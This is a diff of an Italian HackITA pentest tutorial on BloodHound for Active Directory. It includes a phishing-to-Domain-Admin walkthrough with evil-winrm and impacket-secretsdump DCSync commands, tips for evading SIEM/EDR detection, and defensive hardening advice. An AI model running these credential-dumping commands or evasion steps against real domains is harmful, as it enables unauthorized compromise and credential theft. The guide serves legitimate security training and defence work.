-## **Come capisco quali findings sono davvero critici?**
-
-Priorità alta per:
-
-* DCSync rights
-* deleghe pericolose
-* ACL su gruppi Tier-0
-* GPO modificabili da non-admin
-* sessioni admin su server “facili”
-
-## **BloodHound è utile anche per i difensori?**
-
-Sì: è uno dei modi migliori per scoprire **privilege creep** e relazioni pericolose prima che lo faccia qualcun altro.
-
-***
-
-## HackITA — Supporta la Crescita della Formazione Offensiva
-
-Se questo contenuto ti è stato utile e vuoi contribuire alla crescita di HackITA, puoi supportare direttamente il progetto qui:
-
-👉 [https://hackita.it/supporta](https://hackita.it/supporta)
-
-Il tuo supporto ci permette di sviluppare lab realistici, guide tecniche avanzate e scenari offensivi multi-step pensati per professionisti della sicurezza.
-
-***
-
-## Vuoi Testare la Tua Azienda o Portare le Tue Skill al Livello Successivo?
-
-Se rappresenti un’azienda e vuoi valutare concretamente la resilienza della tua infrastruttura contro attacchi mirati, oppure sei un professionista/principiante che vuole migliorare con simulazioni reali:
-
-👉 [https://hackita.it/servizi](https://hackita.it/servizi)
-
-Red Team assessment su misura, simulazioni complete di kill chain e percorsi formativi avanzati progettati per ambienti enterprise reali.
-
-# Link utili
-
-```text
-Neo4j Desktop: https://neo4j.com/download/
-BloodHound releases: https://github.com/BloodHoundAD/BloodHound/releases
-DarthSidious (BloodHound notes): https://hunter2.gitbook.io/darthsidious/enumeration/bloodhound
+```cypher
+MATCH (u:User)-[r:GenericWrite|GenericAll|AddKeyCredentialLink]->(t:User)
+WHERE NOT u.name = t.name
+RETURN u.name, type(r), t.name
 ```
 
 ***
+
+## Scenario pratico — da utente standard a Domain Admin
+
+Scenario: credenziali di `j.smith@corp.local` da phishing.
+
+**1. Raccogli dati**
+
+```bash
+bloodhound-python -d corp.local -u j.smith -p 'Pass123!' -ns 10.10.10.10 -c all
+```
+
+**2. Importa e lancia Shortest Path to Domain Admins**
+
+BloodHound mostra:
+
+```
+j.smith → MemberOf → HelpDesk_Ops
+HelpDesk_Ops → AdminTo → SRV-WEB01
+SRV-WEB01 → HasSession → svc_sql
+svc_sql → MemberOf → Domain Admins
+```
+
+**3. Accedi a SRV-WEB01**
+
+```bash
+evil-winrm -i 10.10.10.20 -u j.smith -p 'Pass123!'
+```
+
+**4. Dump credenziali sessione svc\_sql dalla macchina**
+
+→ Vedi [Mimikatz](/articoli/mimikatz/) | [Pass-the-Hash](/articoli/pass-the-hash/)
+
+**5. DCSync finale con svc\_sql (Domain Admin)**
+
+```bash
+impacket-secretsdump corp.local/svc_sql:'SvcPass!'@10.10.10.10 -just-dc-ntlm
+```
+
+Dominio compromesso.
+
+***
+
+## OPSEC — cosa genera rumore
+
+**SharpHound `--CollectionMethods All`**: query LDAP ad alto volume verso i DC. Visibile in SIEM. Usa le fasi + `--Throttle`.
+
+**Session enumeration**: contatta ogni host via SMB — genera connessioni che i SIEM rilevano come scan interno.
+
+**ACL abuse (WriteDacl, AddMember)**: genera eventi 4662, 4728, 4732 nei log AD. Se auditpol è attivo, finiscono nel SIEM.
+
+**Shadow Credentials**: genera eventi 5136 (modifica attributo oggetto AD). Meno conosciuto dai blue team, ma presente nei log.
+
+**Mitigazioni per bassa detection**:
+
+* Raccolta in fasi con `--Throttle`
+* `--Stealth` per session collection
+* `bloodhound-python` da Kali genera meno rumore sul target
+* Per ambienti con EDR attivo: considera `ldapdomaindump` o `windapsearch` come alternativa
+
+***
+
+## Hardening AD — come ridurre l'attack surface
+
+**Ripulisci ACL pericolose**: rimuovi GenericAll/WriteDacl/WriteOwner da utenti non-admin su oggetti AD. Usa la query BH "Dangerous ACLs" come backlog di remediation.
+
+**Pulisci membership annidate e privilege creep**: ogni trimestre — query *Users with Most Local Admin Rights*.
+
+**Separa i tier**: admin AD non logga su workstation utente. Tier 0 (DC, PKI), Tier 1 (server), Tier 2 (workstation) — sessioni e credenziali separate.
+
+**LAPS**: elimina le password condivise sulle macchine. Spezza il lateral movement orizzontale.
+
+**Disabilita unconstrained delegation**: la maggior parte dei server non ne ha bisogno. Usa constrained delegation o RBCD.
+
+**Controlla GPO**: una GPO modificabile da un non-admin è code execution su tutti i computer target. Usa la query BH dedicata.
+
+**Audita i template ADCS**: esegui `certipy find -vulnerable` trimestralmente. ESC1 e ESC8 compaiono spesso dopo aggiornamenti o configurazioni legacy.
+
+***
+
+## BloodHound Workflow — Cheat Sheet Finale
+
+```
+1.  COLLECT     → SharpHound per fasi (Default → LocalAdmin+Session → ACL)
+2.  IMPORT      → Carica ZIP in BloodHound CE / legacy
+3.  DA PATHS    → Find Shortest Paths to Domain Admins
+4.  TIER-0      → Controlla chi ha controllo su DA, EA, DC, KRBTGT, PKI
+5.  ACL AUDIT   → Dangerous ACLs (GenericAll, WriteDacl, WriteOwner, AddKeyCredentialLink)
+6.  SESSIONS    → DA sessions su workstation non-admin
+7.  DELEGATION  → Unconstrained Delegation + RBCD paths
+8.  DCSYNC      → Chi ha DS-Replication-Get-Changes-All oltre ai DC
+9.  ADCS        → BloodHound CE ESC paths + certipy find -vulnerable
+10. VALIDATE    → Testa l'abuse su ogni finding critico
+11. REPORT      → Documenta path, screenshot, impatto, remediation
+```
+
+***
+
+## FAQ
+
+**BloodHound CE o legacy?**
+CE con Docker è il metodo attuale. Legacy è ancora usato in lab vecchi. Le query Cypher funzionano su entrambi.
+
+**Posso usare BloodHound senza essere admin del dominio?**
+Sì. Un utente standard raccoglie la maggior parte dei dati via query LDAP autenticate normali.
+
+**BloodHound viene rilevato dagli EDR?**
+SharpHound viene flaggato da molti AV/EDR per firma. Considera bloodhound-python da Kali in ambienti con EDR attivo.
+
+**Quanto ci vuole la raccolta su un dominio grande?**
+`Default,GroupMembership` su 10.000 oggetti: 2–5 minuti. `All` con sessioni: 15–30 minuti.
+
+**Qual è la differenza tra BloodHound e SharpHound?**
+BloodHound è la piattaforma di analisi. SharpHound è il collector. Senza SharpHound, BloodHound è vuoto.
+
+**Shadow Credentials funziona sempre?**
+Richiede almeno un DC Windows Server 2016+ con PKINIT attivo. In domini moderni funziona quasi sempre. In domini molto vecchi (2008/2012 only) no.
+
+***
+
+> **Disclaimer:** tutto il contenuto è per uso su sistemi autorizzati in contesti di penetration test legali o audit difensivo. L'uso non autorizzato è illegale.
